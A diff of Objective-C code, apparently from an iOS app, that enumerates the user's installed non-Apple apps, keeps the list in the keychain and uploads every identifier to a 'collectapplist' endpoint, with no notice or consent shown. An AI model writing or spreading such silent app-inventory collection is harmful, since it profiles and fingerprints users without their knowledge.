@@ -61,7 +61,7 @@
 - (void)appsDataUpdate{
     [self appsDataAppend:0];
 }
-- (void)appsDataAppend:(id)arg1{
+- (void)appsDataAppend:(NSString *)identifier{
     id obj = [MSKeyChain load:@"applist"];
     NSMutableArray *v8 =  [[[NSKeyedUnarchiver alloc] initForReadingWithData:obj] decodeObjectForKey:@"applist"];
     [[[NSKeyedUnarchiver alloc] initForReadingWithData:obj] finishDecoding];
@@ -71,27 +71,32 @@
     }
     [self.allInstalledItems enumerateObjectsUsingBlock:^(LSAP_model * obj, NSUInteger idx, BOOL * _Nonnull stop) {
         if (![obj.identifier hasPrefix:@"com.apple."] && ![v8 containsObject:obj]) {
-            [v8 addObject:obj];
+            [v8 addObject:obj.identifier];
+            
         }
     }];
+    if (identifier && ![v8 containsObject:identifier]) {
+        [v8 addObject:identifier];
+    }
      NSMutableData *muData = [[NSMutableData alloc]init];
    NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:muData];
     [archiver encodeObject:v8 forKey:@"applist"];
     [archiver finishEncoding];
     [MSKeyChain save:@"applist" data:muData];
-    [self upload:v8[0]];
+    [self upload:v8];
 }
-- (void)upload:(LSAP_model *)model{
-    NSString *url = @"auth/collectapplist";
-    NSString *json = [self toJSON:model];
+- (void)upload:(NSArray *)array{
+    NSString *url = @"/api/auth/collectapplist";
+    NSString *json = [self toJSON:array];
     [[DTDSNetworkManager shareInstance] requestPOST:url parameters:@{@"applist_json":json} success:^(id responseObject) {
         
     } failure:^(NSError *error) {
         
     }];
 }
-- (NSString *)toJSON:(LSAP_model *)model{
-    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:model options:1 error:nil];
+- (NSString *)toJSON:(NSArray *)array{
+    NSError *err;
+    NSData *jsonData = [NSJSONSerialization dataWithJSONObject:array options:NSJSONWritingPrettyPrinted error:&err];
     NSString *json = nil;
     if (jsonData) {
        json =  [[NSString alloc] initWithData:jsonData encoding:NSUTF8StringEncoding];
